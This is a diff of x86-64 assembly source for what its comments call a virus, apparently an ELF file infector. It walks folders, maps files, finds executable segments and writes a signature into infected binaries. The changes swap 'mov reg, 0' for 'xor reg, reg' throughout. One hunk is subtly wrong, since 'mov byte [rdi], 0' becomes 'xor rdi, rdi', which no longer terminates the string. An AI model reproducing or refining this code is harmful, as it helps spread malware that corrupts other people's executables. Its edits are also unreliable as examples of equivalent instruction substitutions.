@@ -116,7 +116,7 @@ _jmp_instr:
 							; or to next instruction if original virus
 
 	mov rax, SYS_EXIT				; exit(
-	mov rdi, 0					; 0
+	xor rdi, rdi					; 0
 	syscall						; );
 
 ; void treate_folder(char const *_folder);
@@ -242,7 +242,7 @@ treat_file:
 		cmp byte [rsi], 0			; if (*src != 0)
 		jnz .filename				; 	goto .filename;
 	
-	mov byte [rdi], 0				; *dest = 0;
+	xor rdi, rdi					; *dest = 0;
 	
 
 	; Open file
@@ -271,7 +271,7 @@ treat_file:
 
 	; Map file
 	mov rax, SYS_MMAP				; _ret = mmap(
-	mov rdi, 0					; 	0,
+	xor rdi, rdi					; 	0,
 	mov rsi, [filesize]				; 	filesize,
 	mov rdx, PROT_READ | PROT_WRITE			; 	PROT_READ | PROT_WRITE,
 	mov r10, MAP_SHARED				; 	MAP_SHARED,
@@ -366,7 +366,7 @@ find_exec_segment:
 	mov [e_phnum], rax				; ...
 
 	; loop through program headers
-	mov rsi, 0					; i = 0;
+	xor rsi, rsi					; i = 0;
 	.begin_phdr_loop:				; while (true) {
 		mov rax, [file_map]			; cur_phdr = file_map
 		add rax, [e_phoff]			; 	+ elf64_hdr.e_phoff
@@ -433,7 +433,7 @@ has_signature:
 ; int is_string(char const *buffer, char const *value, size_t length)
 ; rax is_string(rdi buffer, rsi value, rdx length);
 is_string:
-	mov r8, 0					; counter = 0;
+	xor r8, r8					; counter = 0;
 	.begin_string_loop:				; while (true) {
 		mov al, [rdi + r8]			; 	_c = buffer[counter];
 		mov bl, [rsi + r8]			; 	_value_c = value[counter];
@@ -465,7 +465,7 @@ sign:
 	mov rax, [rsi]					; ..
 	add rdi, rax					; file_map += size;
 
-	mov rsi, 0					; counter = 0;
+	xor rsi, rsi					; counter = 0;
 	.begin_signature_loop:				; while (true) {
 		mov bl, [signature + rsi]		; 	_signature_c = signature[counter];
 		mov [rdi + rsi], bl			; 	file_map[counter] = _signature_c;
